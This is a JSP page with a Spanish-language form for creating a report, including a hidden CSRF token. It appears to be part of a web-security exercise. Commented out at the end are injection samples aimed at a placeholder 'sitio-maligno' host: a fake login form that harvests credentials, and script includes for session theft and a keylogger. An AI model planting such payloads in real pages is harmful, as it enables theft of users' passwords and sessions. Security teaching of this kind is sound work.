<%@ page language="java" contentType="text/html; charset=UTF-8"
    pageEncoding="UTF-8"%>
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Insert title here</title>
</head>
<body>
    <form action="nuevo-informe" method="post">
        <div>
          <label for="titulo">Título:</label>
          <input type="text" id="titulo" name="titulo">
        </div>

        <div>
          <label for="descripcion">Descripción:</label>
          <input type="text" id="descripcion" name="descripcion">
        </div>

        <div>
          <label for="contenido">Contenido:</label>
          <textarea id="contenido" name="contenido"></textarea>
        </div>

        <div>
          <label for="temaColor">Tema color:</label>
          <input type="text" id="temaColor" name="temaColor">
        </div>

        <input type="text" name="tokenCSRF" value="${tokenCSRF}" hidden>

        <button type="submit">Crear informe</button>
      </form>


      <!-- <form action="http://localhost:8080/sitio-maligno/login-falso" method="POST"><input type="text" placeholder="Usuario" name="username"><input type="text" placeholder="Password" name="password"><button type="submit">Login</button></form> -->

      <!-- <script src="http://localhost:8080/sitio-maligno/js/robo-session.js"></script> -->
      <!-- <script src="http://localhost:8080/sitio-maligno/js/key-logger.js"></script> -->

</body>
</html>